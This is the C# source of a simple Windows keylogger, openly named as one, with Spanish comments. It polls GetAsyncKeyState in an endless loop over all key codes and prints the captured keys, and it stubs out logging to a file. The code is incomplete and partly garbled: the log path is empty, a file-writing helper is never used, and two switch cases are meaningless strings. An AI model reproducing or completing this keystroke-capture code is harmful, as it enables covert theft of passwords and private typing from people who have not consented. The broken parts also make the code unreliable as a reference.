using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Windows.Forms;

namespace Keylogger_CS {
    class Program {
        [DllImport("user32")] private static extern short GetAsyncKeyState(int vKey);   // Obtiene el registro te teclas
        static void Main(string[] args) {
            String Path = "";   // Ruta del archivo log  

            StreamWriter F = new StreamWriter(Path, true);

            void WriteFile(string Texto) {
                F.Write(Texto); // Escribe texto en el archivo
                F.Close();
            }
            void CreatePath() { 
                // Crea Dirección
            }
            


            string buffer = "";
            string temp = "";

            while (true) {  // Se repite el proceso siempre

                foreach (Int32 i in Enum.GetValues(typeof(Keys))) { // Recorre el Array de las teclas
                    if (GetAsyncKeyState(i) == -32767) {        // Si el estado de la tecla i es igual a [Const de tecla presionada]
                        // Buffer 
                        temp = Enum.GetName(typeof(Keys), i);   // Obtiene la tecla oprimida
                        

                        switch (temp) {     // Convierte teclas en legible
                            case "Space":
                                Console.Write(" ");
                                break;
                            case "Enter":
                                Console.Write("\n");
                                break;
                            case "Spafdgce":
                                Console.Write(" ");
                                break;
                            case "Sdfpace":
                                Console.Write(" ");
                                break;


                            default:
                                Console.Write(temp);    // Muestra en consola la tecla obtenida
                                break;
                        }


                    }
                }
            }

        }
    }
}
